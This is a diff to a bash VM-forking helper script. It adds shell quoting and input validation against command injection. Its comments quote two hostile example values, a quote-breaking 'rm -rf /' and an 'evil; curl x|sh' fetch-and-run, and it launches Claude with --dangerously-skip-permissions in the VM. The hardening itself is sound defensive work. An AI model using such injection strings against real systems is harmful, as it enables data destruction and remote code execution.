@@ -16,6 +16,28 @@
 set -uo pipefail
 
 # ---------------------------------------------------------------------------
+# Shell-quote helper — single-quote safe interpolation
+# ---------------------------------------------------------------------------
+# Wrap an arbitrary value so it can be safely embedded in a single-quoted
+# string passed to a remote shell (`boxd exec "..."`, `ssh host '...'`).
+# Replaces every `'` with `'\''` and wraps the result in `'...'`.
+#
+# Usage:
+#   safe_pr=$(_boxd_shell_quote "$pr")
+#   "$BOXD_BIN" exec "$vm" -- "gh pr checkout $safe_pr"
+#
+# Without this, a value containing `'; rm -rf /; echo '` interpolated into a
+# `'$x'` slot would close the quote and execute as a separate command. We
+# additionally validate input shape at the entry points (digit-only PR
+# numbers, git-ref-format branches, slugified tmux names) — quoting is the
+# defense-in-depth so a missed validation does not become an RCE.
+_boxd_shell_quote() {
+  local s="${1-}"
+  # Inline %s -> %s_with_quotes_escaped using bash parameter expansion.
+  printf "'%s'" "${s//\'/\'\\\'\'}"
+}
+
+# ---------------------------------------------------------------------------
 # Naming primitives
 # ---------------------------------------------------------------------------
 
@@ -448,8 +470,16 @@ EOF
   # For branch/issue, fall back to fetch-then-checkout against origin.
   # Fails closed: a partial fork (envs + proxies wired against the wrong
   # branch) is worse than a hard error.
+  #
+  # Quoting: every variable interpolated into the remote shell string is
+  # run through _boxd_shell_quote so a value containing a single quote
+  # can't escape its slot and inject a command. Defense-in-depth on top
+  # of the upstream shape validation (digit-only PR, git-ref-format
+  # branch).
   if [ -n "$pr" ]; then
-    if ! "$BOXD_BIN" exec "$vm" -- "cd langwatch && gh pr checkout '$pr' --force 2>&1" >/dev/null; then
+    local q_pr
+    q_pr=$(_boxd_shell_quote "$pr")
+    if ! "$BOXD_BIN" exec "$vm" -- "cd langwatch && gh pr checkout $q_pr --force 2>&1" >/dev/null; then
       cat <<EOF >&2
 ERROR: 'gh pr checkout $pr' failed inside $vm. If the PR is from a fork
        repo, the in-VM gh may not have access to it. Inspect with:
@@ -460,7 +490,10 @@ EOF
       return 1
     fi
   else
-    if ! "$BOXD_BIN" exec "$vm" -- "cd langwatch && git fetch origin && git checkout '$branch' 2>/dev/null || git checkout -b '$branch' 'origin/$branch' 2>/dev/null || git checkout 'origin/$branch'" >/dev/null; then
+    local q_branch q_origin_branch
+    q_branch=$(_boxd_shell_quote "$branch")
+    q_origin_branch=$(_boxd_shell_quote "origin/$branch")
+    if ! "$BOXD_BIN" exec "$vm" -- "cd langwatch && git fetch origin && git checkout $q_branch 2>/dev/null || git checkout -b $q_branch $q_origin_branch 2>/dev/null || git checkout $q_origin_branch" >/dev/null; then
       echo "ERROR: failed to check out '$branch' inside $vm." >&2
       return 1
     fi
@@ -472,8 +505,13 @@ EOF
 
   if [ "$start_tmux" = "1" ]; then
     # AC#12: tmux + Claude session inside the VM, named claude-<slug>/issue<N>.
+    # $tmux comes from boxd_tmux_name which derives from a slugified source
+    # (already constrained to [a-z0-9-]+), but quote it anyway so a future
+    # change upstream can't turn an injection into an RCE.
+    local q_tmux
+    q_tmux=$(_boxd_shell_quote "$tmux")
     if "$BOXD_BIN" exec "$vm" -- \
-        "tmux new-session -d -s '$tmux' 'cd langwatch && claude --dangerously-skip-permissions'" \
+        "tmux new-session -d -s $q_tmux 'cd langwatch && claude --dangerously-skip-permissions'" \
         >/dev/null 2>&1; then
       printf '  started tmux session %s on %s\n' "$tmux" "$vm" >&2
     else
@@ -499,6 +537,11 @@ _boxd_arg_for_source() {
 boxd_fork_pr() {
   local pr="${1-}"
   [ -n "$pr" ] || { echo "usage: make boxd-fork-pr PR=<number>" >&2; return 1; }
+  # Shape-validate before anything touches a remote shell — PR is digits only.
+  if ! [[ "$pr" =~ ^[0-9]+$ ]]; then
+    echo "ERROR: PR must be a positive integer, got: $pr" >&2
+    return 1
+  fi
   local branch
   branch=$(boxd_resolve_pr_branch "$pr") || {
     echo "ERROR: could not resolve PR #$pr via gh." >&2
@@ -522,6 +565,11 @@ boxd_fork_pr() {
 boxd_fork_branch() {
   local branch="${1-}"
   [ -n "$branch" ] || { echo "usage: make boxd-fork-branch BRANCH=<name>" >&2; return 1; }
+  # git's own validator catches injection patterns ($, `, ;, newlines, etc.).
+  if ! git check-ref-format --branch "$branch" >/dev/null 2>&1; then
+    echo "ERROR: '$branch' is not a valid git branch name." >&2
+    return 1
+  fi
   local slug
   slug=$(boxd_slug "$branch")
   boxd_branch_issue_collision_warning "$slug"
@@ -534,6 +582,11 @@ boxd_fork_branch() {
 boxd_fork_issue() {
   local issue="${1-}"
   [ -n "$issue" ] || { echo "usage: make boxd-fork-issue ISSUE=<number>" >&2; return 1; }
+  # Shape-validate before anything touches a remote shell — issue is digits only.
+  if ! [[ "$issue" =~ ^[0-9]+$ ]]; then
+    echo "ERROR: ISSUE must be a positive integer, got: $issue" >&2
+    return 1
+  fi
 
   # Resolve issue title via gh, build branch via existing worktree.sh logic.
   local title slug branch
@@ -590,12 +643,24 @@ EOF
     echo "ERROR: 'boxd new --name=$vm' failed." >&2
     return 1
   fi
+  # Validate $BOXD_FORK_REPO before interpolating it into the remote shell.
+  # GitHub repo grammar: owner/repo, each segment [A-Za-z0-9._-]+, no
+  # slashes inside a segment. Without this guard, a value like
+  # 'evil; curl x|sh #' would inject commands during golden provisioning.
+  if ! [[ "${BOXD_FORK_REPO:-}" =~ ^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$ ]]; then
+    echo "ERROR: BOXD_FORK_REPO ('${BOXD_FORK_REPO:-}') is not a valid <owner>/<repo>." >&2
+    return 1
+  fi
   # Provision: install Node 20 from NodeSource (apt's `nodejs` ships Node
   # 12.x on Ubuntu 22.04 — older than corepack's 16.9.0 minimum, which
   # would silently abort the rest of the recipe under `set -e`). Then
   # clone repo and install deps. The `set -e` is INSIDE the remote shell
   # only; we additionally check the host-side `boxd exec` exit code so
   # provisioning failures don't slip past the success printf.
+  #
+  # $BOXD_FORK_REPO is interpolated directly into the remote shell here —
+  # safe because the regex validation above restricts it to
+  # [A-Za-z0-9._-]+/[A-Za-z0-9._-]+ (no shell metacharacters possible).
   if ! "$BOXD_BIN" exec "$vm" -- "
     set -euo pipefail
     if ! command -v node >/dev/null 2>&1 \\
